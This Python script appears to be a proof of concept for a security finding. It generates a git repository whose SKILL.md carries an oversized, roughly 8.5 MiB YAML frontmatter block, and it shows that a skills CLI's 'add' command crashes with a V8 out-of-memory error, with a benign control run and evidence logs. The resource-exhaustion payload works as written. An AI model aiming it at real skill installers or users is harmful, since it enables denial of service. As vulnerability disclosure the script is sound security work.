#!/usr/bin/env python3
"""Executed PoC for unbounded SKILL.md frontmatter parsing via git source install."""
from __future__ import annotations

import json
import os
import platform
import shutil
import subprocess
import sys
from pathlib import Path


FINDING_DIR = Path(__file__).resolve().parent
EVIDENCE_DIR = FINDING_DIR / "evidence"
EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)


def find_repo_root() -> Path:
    for candidate in [FINDING_DIR, *FINDING_DIR.parents]:
        if (candidate / "package.json").is_file() and (candidate / "src" / "cli.ts").is_file():
            return candidate
    raise RuntimeError("could not locate repository root containing package.json and src/cli.ts")


REPO_ROOT = find_repo_root()


SETUP_SH = r'''#!/usr/bin/env bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../../../.." && pwd)"
cd "$REPO_ROOT"

echo "[setup] repo=$REPO_ROOT"
echo "[setup] node=$(node --version)"
echo "[setup] pnpm=$(pnpm --version)"
echo "[setup] git=$(git --version)"

if [ ! -d node_modules/yaml ]; then
  echo "[setup] installing dependencies"
  pnpm install --frozen-lockfile
else
  echo "[setup] dependencies already present"
fi
'''


EXPLOIT_SH = r'''#!/usr/bin/env bash
set -u
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../../../.." && pwd)"
EVIDENCE_DIR="$SCRIPT_DIR"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

MAL_REPO="$WORK/malicious-skill-repo"
mkdir -p "$MAL_REPO"

# 500k YAML keys produce an ~8.5 MiB frontmatter block. The payload is small
# enough for a git repository but large enough to exhaust a constrained CLI heap
# because src/skills.ts reads the whole file and src/frontmatter.ts parses it
# without byte or parser-resource limits.
python3 - "$MAL_REPO/SKILL.md" <<'PY'
from pathlib import Path
import sys
out = Path(sys.argv[1])
with out.open('w', encoding='utf-8') as f:
    f.write('---\n')
    f.write('name: exploit-frontmatter\n')
    f.write('description: attacker controlled SKILL.md resource exhaustion\n')
    for i in range(500_000):
        f.write(f'k{i:06d}: v{i:06d}\n')
    f.write('---\nbody\n')
print(out.stat().st_size)
PY
PAYLOAD_BYTES="$(wc -c < "$MAL_REPO/SKILL.md" | tr -d ' ')"

(
  cd "$MAL_REPO" &&
  git init -q &&
  git config user.email poc@example.invalid &&
  git config user.name poc &&
  git add SKILL.md &&
  git -c core.hooksPath=/dev/null commit -q -m 'malicious skill'
)

APP_LOG="$EVIDENCE_DIR/app-output.log"
: > "$APP_LOG"
POC_NODE_OPTIONS="${POC_NODE_OPTIONS:---max-old-space-size=32}"

echo "[exploit] payload_bytes=$PAYLOAD_BYTES"
echo "[exploit] source=file://$MAL_REPO"
echo "[exploit] command: NODE_OPTIONS=$POC_NODE_OPTIONS node src/cli.ts add file://<malicious-repo> --list"
echo "[exploit] path: parseSource(type=git) -> cloneRepo -> discoverSkills -> parseSkillMd -> parseFrontmatter"

env NODE_OPTIONS="$POC_NODE_OPTIONS" SKILLS_CLONE_TIMEOUT_MS=30000 CI=1 \
  node "$REPO_ROOT/src/cli.ts" add "file://$MAL_REPO" --list > "$APP_LOG" 2>&1
CLI_RC=$?

cat "$APP_LOG"
echo "[exploit] cli_exit=$CLI_RC"

if grep -Eiq 'heap out of memory|Allocation failed|FATAL ERROR' "$APP_LOG"; then
  {
    echo "CONFIRMED: attacker-controlled git SKILL.md aborted the real skills CLI with V8 out-of-memory."
    echo "payload_bytes=$PAYLOAD_BYTES"
    echo "node_options=$POC_NODE_OPTIONS"
    echo "cli_exit=$CLI_RC"
    echo "marker=$(grep -Eim1 'heap out of memory|Allocation failed|FATAL ERROR' "$APP_LOG")"
  } > "$EVIDENCE_DIR/impact.log"
  exit 0
fi

if [ "$CLI_RC" -ne 0 ]; then
  {
    echo "INCONCLUSIVE: CLI failed, but the expected out-of-memory marker was not observed."
    echo "payload_bytes=$PAYLOAD_BYTES"
    echo "node_options=$POC_NODE_OPTIONS"
    echo "cli_exit=$CLI_RC"
  } > "$EVIDENCE_DIR/impact.log"
  exit 2
fi

{
  echo "FAILED: CLI completed successfully; out-of-memory impact was not reproduced."
  echo "payload_bytes=$PAYLOAD_BYTES"
  echo "node_options=$POC_NODE_OPTIONS"
  echo "cli_exit=$CLI_RC"
} > "$EVIDENCE_DIR/impact.log"
exit 1
'''


def write_executable(path: Path, content: str) -> None:
    path.write_text(content, encoding="utf-8")
    path.chmod(0o755)


def run_logged(cmd: list[str], log_path: Path, timeout: int = 180) -> int:
    with log_path.open("w", encoding="utf-8") as log:
        log.write(f"$ {' '.join(cmd)}\n")
        log.flush()
        try:
            proc = subprocess.run(
                cmd,
                cwd=str(FINDING_DIR),
                stdout=log,
                stderr=subprocess.STDOUT,
                text=True,
                timeout=timeout,
            )
            log.write(f"\n[exit] {proc.returncode}\n")
            return proc.returncode
        except subprocess.TimeoutExpired:
            log.write("\n[timeout]\n")
            return 124


def command_output(cmd: list[str]) -> str:
    try:
        return subprocess.check_output(cmd, cwd=str(REPO_ROOT), text=True, stderr=subprocess.STDOUT).strip()
    except Exception as exc:  # pragma: no cover - diagnostic only
        return f"unavailable: {exc}"


def write_env_info() -> None:
    info = [
        f"repo_root={REPO_ROOT}",
        f"platform={platform.platform()}",
        f"python={sys.version.split()[0]}",
        f"node={command_output(['node', '--version'])}",
        f"pnpm={command_output(['pnpm', '--version'])}",
        f"git={command_output(['git', '--version'])}",
        "protocol=local",
        "entrypoint=node src/cli.ts add file://<attacker-git-repo> --list",
    ]
    (EVIDENCE_DIR / "env-info.txt").write_text("\n".join(info) + "\n", encoding="utf-8")


def run_healthcheck() -> int:
    script = f'''#!/usr/bin/env bash
set -euo pipefail
ROOT={str(REPO_ROOT)!r}
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT
cat > "$WORK/SKILL.md" <<'EOF'
---
name: benign-control
description: small SKILL.md validates the CLI under the same heap cap
---
body
EOF
(
  cd "$WORK" &&
  git init -q &&
  git config user.email poc@example.invalid &&
  git config user.name poc &&
  git add SKILL.md &&
  git -c core.hooksPath=/dev/null commit -q -m benign
)
echo "[health] CLI version"
node "$ROOT/src/cli.ts" --version
echo "[health] benign git-source install list under NODE_OPTIONS=--max-old-space-size=32"
env NODE_OPTIONS="--max-old-space-size=32" SKILLS_CLONE_TIMEOUT_MS=30000 CI=1 \
  node "$ROOT/src/cli.ts" add "file://$WORK" --list
echo "[health] benign control completed"
'''
    health_path = EVIDENCE_DIR / "healthcheck.sh"
    write_executable(health_path, script)
    return run_logged(["bash", str(health_path)], EVIDENCE_DIR / "healthcheck.log", timeout=120)


def main() -> None:
    write_executable(EVIDENCE_DIR / "setup.sh", SETUP_SH)
    write_executable(EVIDENCE_DIR / "exploit.sh", EXPLOIT_SH)
    write_env_info()

    setup_rc = run_logged(["bash", str(EVIDENCE_DIR / "setup.sh")], EVIDENCE_DIR / "setup.log", timeout=180)
    if setup_rc != 0:
        print(json.dumps({"status": "inconclusive", "evidence": "setup.sh failed", "notes": "see evidence/setup.log"}))
        return

    health_rc = run_healthcheck()
    if health_rc != 0:
        print(json.dumps({"status": "inconclusive", "evidence": "healthcheck failed", "notes": "see evidence/healthcheck.log"}))
        return

    exploit_rc = run_logged(["bash", str(EVIDENCE_DIR / "exploit.sh")], EVIDENCE_DIR / "exploit.log", timeout=180)
    impact = (EVIDENCE_DIR / "impact.log").read_text(encoding="utf-8", errors="replace") if (EVIDENCE_DIR / "impact.log").exists() else ""

    if exploit_rc == 0 and "CONFIRMED:" in impact:
        print(json.dumps({"status": "confirmed", "evidence": "V8 heap out-of-memory abort in skills add for attacker-controlled git SKILL.md", "notes": "see evidence/impact.log and evidence/app-output.log"}))
    elif exploit_rc == 124:
        print(json.dumps({"status": "inconclusive", "evidence": "exploit execution timed out", "notes": "see evidence/exploit.log"}))
    else:
        print(json.dumps({"status": "failed", "evidence": "out-of-memory marker not observed", "notes": "see evidence/exploit.log and evidence/impact.log"}))


if __name__ == "__main__":
    main()
